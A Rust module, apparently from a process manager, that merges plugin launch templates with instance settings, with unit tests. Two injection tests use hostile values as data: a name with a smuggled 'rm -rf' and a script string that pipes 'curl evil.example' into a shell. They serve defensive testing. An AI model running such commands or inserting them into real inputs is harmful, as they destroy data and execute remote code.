use std::collections::HashMap;
use std::path::PathBuf;

use anyhow::{anyhow, Result};

use crate::config::{resolve_path, InstanceSpec, PluginSpec};

/// 插件模板与实例规格合并后的启动方案
#[derive(Debug, Clone)]
pub struct ResolvedLaunch {
    pub program: String,
    pub args: Vec<String>,
    pub env: HashMap<String, String>,
    pub cwd: Option<PathBuf>,
    pub health_url: Option<String>,
    pub health_interval_secs: u64,
    pub grace_secs: u64,
    pub shutdown_line: Option<String>,
}

fn subst(tpl: &str, script: &str, port: &str, name: &str) -> String {
    tpl.replace("{script}", script)
        .replace("{port}", port)
        .replace("{name}", name)
}

/// 将插件模板与实例规格合并为可执行方案
pub fn resolve(
    root: &PathBuf,
    plugins: &HashMap<String, PluginSpec>,
    spec: &InstanceSpec,
) -> Result<ResolvedLaunch> {
    let plugin = plugins
        .get(&spec.plugin)
        .ok_or_else(|| anyhow!("未找到插件 \"{}\"，请检查 plugins/ 目录", spec.plugin))?;

    let script = spec.script.clone().unwrap_or_default();
    let port = spec
        .port
        .map(|p| p.to_string())
        .unwrap_or_else(|| "0".into());
    let name = spec.name.as_str();

    let program = subst(&plugin.command, &script, &port, name);
    if program.trim().is_empty() {
        return Err(anyhow!("插件 {} 的 command 为空", spec.plugin));
    }

    let mut args: Vec<String> = plugin
        .args
        .iter()
        .map(|a| subst(a, &script, &port, name))
        .collect();
    for a in &spec.args {
        args.push(subst(a, &script, &port, name));
    }

    let mut env = plugin.env.clone();
    for (k, v) in &spec.env {
        env.insert(k.clone(), subst(v, &script, &port, name));
    }
    if let Some(p) = spec.port {
        env.insert("PORT".into(), p.to_string());
    }

    let health_url = spec
        .health_url
        .clone()
        .or_else(|| plugin.health_url.clone())
        .map(|h| subst(&h, &script, &port, name));

    let cwd = resolve_path(root, &spec.workdir);

    Ok(ResolvedLaunch {
        program,
        args,
        env,
        cwd,
        health_url,
        health_interval_secs: plugin.health_interval_secs.max(3),
        grace_secs: plugin.grace_secs.max(1),
        shutdown_line: spec
            .shutdown_line
            .clone()
            .or_else(|| plugin.shutdown_line.clone()),
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn node_plugin() -> PluginSpec {
        PluginSpec {
            name: "node".into(),
            command: "node".into(),
            args: vec!["{script}".into()],
            env: HashMap::new(),
            health_url: Some("http://127.0.0.1:{port}/health".into()),
            health_interval_secs: 10,
            grace_secs: 5,
            shutdown_line: None,
        }
    }

    fn inst(name: &str, script: &str, port: Option<u16>) -> InstanceSpec {
        InstanceSpec {
            name: name.into(),
            plugin: "node".into(),
            workdir: None,
            script: Some(script.into()),
            args: vec![],
            port,
            env: HashMap::new(),
            autostart: false,
            restart_policy: Default::default(),
            max_retries: 5,
            health_url: None,
            shutdown_line: None,
        }
    }

    fn plugins_map() -> HashMap<String, PluginSpec> {
        let mut m = HashMap::new();
        m.insert("node".into(), node_plugin());
        m
    }

    #[test]
    fn subst_replaces_all_placeholders() {
        assert_eq!(
            subst("{script}:{port}:{name}", "app.js", "3001", "web1"),
            "app.js:3001:web1"
        );
        // 占位符缺失时原样保留（不会 panic）
        assert_eq!(subst("{script}", "", "", ""), "");
    }

    #[test]
    fn resolve_happy_path_injects_port_and_health() {
        let root = PathBuf::from("/srv");
        let spec = inst("web1", "server.js", Some(3001));
        let launch = resolve(&root, &plugins_map(), &spec).unwrap();
        assert_eq!(launch.program, "node");
        assert_eq!(launch.args, vec!["server.js".to_string()]);
        // PORT 环境变量被注入
        assert_eq!(launch.env.get("PORT").unwrap(), "3001");
        // 健康 URL 模板被替换
        assert_eq!(
            launch.health_url.as_deref(),
            Some("http://127.0.0.1:3001/health")
        );
        // interval/grace 有下限保护
        assert!(launch.health_interval_secs >= 3);
        assert!(launch.grace_secs >= 1);
    }

    #[test]
    fn resolve_appends_instance_args_after_plugin_args() {
        let root = PathBuf::from("/srv");
        let mut spec = inst("web1", "server.js", None);
        spec.args = vec!["--port".into(), "{port}".into(), "--name".into(), "{name}".into()];
        let launch = resolve(&root, &plugins_map(), &spec).unwrap();
        // plugin.args 在前，spec.args 追加在后；{port} 缺省时为 "0"
        assert_eq!(
            launch.args,
            vec![
                "server.js".to_string(),
                "--port".to_string(),
                "0".to_string(),
                "--name".to_string(),
                "web1".to_string(),
            ]
        );
    }

    #[test]
    fn resolve_rejects_unknown_plugin() {
        let root = PathBuf::from("/srv");
        let mut spec = inst("web1", "server.js", None);
        spec.plugin = "nosuch".into();
        let err = resolve(&root, &plugins_map(), &spec).unwrap_err();
        assert!(err.to_string().contains("未找到插件"));
    }

    #[test]
    fn resolve_rejects_empty_program() {
        let root = PathBuf::from("/srv");
        let mut m = HashMap::new();
        m.insert(
            "empty".into(),
            PluginSpec {
                name: "empty".into(),
                command: "".into(),
                args: vec![],
                env: HashMap::new(),
                health_url: None,
                health_interval_secs: 10,
                grace_secs: 5,
                shutdown_line: None,
            },
        );
        let mut spec = inst("web1", "x", None);
        spec.plugin = "empty".into();
        let err = resolve(&root, &m, &spec).unwrap_err();
        assert!(err.to_string().contains("command 为空"));
    }

    #[test]
    fn instance_health_url_overrides_plugin() {
        let root = PathBuf::from("/srv");
        let mut spec = inst("web1", "server.js", Some(3001));
        spec.health_url = Some("http://127.0.0.1:{name}/custom".into());
        let launch = resolve(&root, &plugins_map(), &spec).unwrap();
        assert_eq!(
            launch.health_url.as_deref(),
            Some("http://127.0.0.1:web1/custom")
        );
    }

    // --- 注入测试：实例名/脚本里带 shell 元字符，必须作为单个字面参数传递，
    //     build_command 用 Command::new(program).args(args)（无 shell），
    //     因此 `; && $(...) |` 不会被 shell 解析。这里断言解析结果原样保留且不被拆分。
    #[test]
    fn injection_payload_in_name_stays_literal_single_arg() {
        let root = PathBuf::from("/srv");
        let evil_name = "web1; rm -rf C:\\ / & calc.exe #";
        let mut spec = inst(evil_name, "server.js", Some(3001));
        spec.args = vec!["--name".into(), "{name}".into()];
        let launch = resolve(&root, &plugins_map(), &spec).unwrap();
        // program 不被污染
        assert_eq!(launch.program, "node");
        // 恶意 name 必须作为单个参数元素原样存在，而不是被拆成多个
        let name_arg = launch.args.iter().find(|a| a.starts_with("web1;")).unwrap();
        assert_eq!(name_arg, evil_name);
        assert_eq!(launch.args.len(), 3); // ["server.js", "--name", evil]
    }

    #[test]
    fn injection_payload_in_script_is_literal_arg() {
        let root = PathBuf::from("/srv");
        let evil_script = "a.js && curl evil.example | sh";
        let spec = inst("web1", evil_script, None);
        let launch = resolve(&root, &plugins_map(), &spec).unwrap();
        // 整个恶意串是单个 argv 元素（Command::new 不经 shell）
        assert_eq!(launch.args[0], evil_script);
        assert_eq!(launch.args.len(), 1);
    }
}
